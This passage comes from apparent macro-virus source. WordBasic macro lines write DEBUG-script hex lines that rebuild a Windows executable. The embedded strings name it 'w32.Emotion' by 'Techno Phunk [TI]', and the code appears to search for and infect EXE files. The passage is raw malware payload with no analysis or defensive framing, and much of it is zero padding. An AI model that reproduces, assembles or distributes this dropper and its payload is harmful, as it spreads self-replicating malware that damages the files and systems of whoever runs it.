Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 6a 00 e8 77 06 00 00 68 04 01 00 00 68 25 14 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 50 e8 a3 06 00 00 e9 9d 00 00 00 68 04 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 68 1d 12 40 00 e8 77 06 00 00 68 1d 12 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 e8 79 06 00 00 c6 05 39 15 40 00 01 eb 7b e8 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 06 00 00 8b f0 bf 25 14 40 00 aa ac 0a c0 75 fa " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 b8 2e 00 00 00 bf 25 14 40 00 b9 04 01 00 00 f2 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 ae c7 07 62 69 6e 20 66 c7 05 25 14 40 00 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 68 29 15 40 00 e8 22 06 00 00 80 3d 2b 15 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 05 75 23 80 3d 2f 15 40 00 0d 75 1a 6a 10 68 6d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 11 40 00 68 91 11 40 00 6a 00 e8 27 06 00 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 01 e8 1a 06 00 00 6a 01 68 25 14 40 00 e8 02 06 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 6a 00 e8 bf 05 00 00 68 3a 15 40 00 68 67 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 11 40 00 e8 c8 05 00 00 83 f8 ff 74 3e bf 3a 15 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 40 00 8d 77 2c 50 eb 45 57 8d 7f 2c b9 0d 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 32 c0 f3 aa bf 21 13 40 00 b9 0d 00 00 00 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 c0 f3 aa 5f 58 50 57 50 e8 87 05 00 00 0b c0 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 0a bf 3a 15 40 00 8d 77 2c eb 12 80 3d 39 15 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 01 0f 84 26 ff ff ff e9 ff fe ff ff 57 66 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 77 2c bf 21 13 40 00 ac aa 0a c0 75 fa 33 c0 bf " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 21 13 40 00 b9 41 00 00 00 f2 ae c7 47 fc 62 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 6e 00 5f 68 21 13 40 00 8d 47 2c 50 e8 57 05 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 6a 00 8d 47 2c 50 b8 25 14 40 00 50 e8 34 05 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 e9 71 ff ff ff 2a 2e 45 58 45 00 77 33 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 2e 45 6d 6f 74 69 6f 6e 20 2d 20 42 79 3a 20 54 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 65 63 68 6e 6f 20 50 68 75 6e 6b 20 5b 54 49 5d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 41 20 70 6f 6f 6c 20 6f 66 20 65 6d 6f 74 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 6f 6e 73 2c 20 62 65 61 74 65 6e 20 61 6e 64 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 61 62 75 73 65 64 2e 0d 0a 57 68 6f 20 77 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 6c 20 73 77 69 6d 20 69 6e 20 74 68 65 20 73 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 61 6c 65 20 77 61 74 65 72 73 3f 20 4e 6f 74 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 61 20 6f 6e 65 0d 0a 42 75 74 20 6d 61 6e 79 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 77 69 6c 6c 20 73 63 6f 66 66 20 61 6e 64 20 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 65 73 74 72 6f 79 20 74 68 69 73 20 70 6f 6f 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 20 77 69 74 68 20 61 70 61 74 68 79 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 00 00 00 00 00 00 00 00 ff 25 7c 30 40 00 ff 25 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 80 30 40 00 ff 25 84 30 40 00 ff 25 88 30 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 ff 25 8c 30 40 00 ff 25 90 30 40 00 ff 25 94 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 40 00 ff 25 98 30 40 00 ff 25 9c 30 40 00 ff 25 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 a0 30 40 00 ff 25 a4 30 40 00 ff 25 a8 30 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 ff 25 b0 30 40 00 ff 25 b4 30 40 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 3c 30 00 00 00 00 00 00 00 00 00 00 bc 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
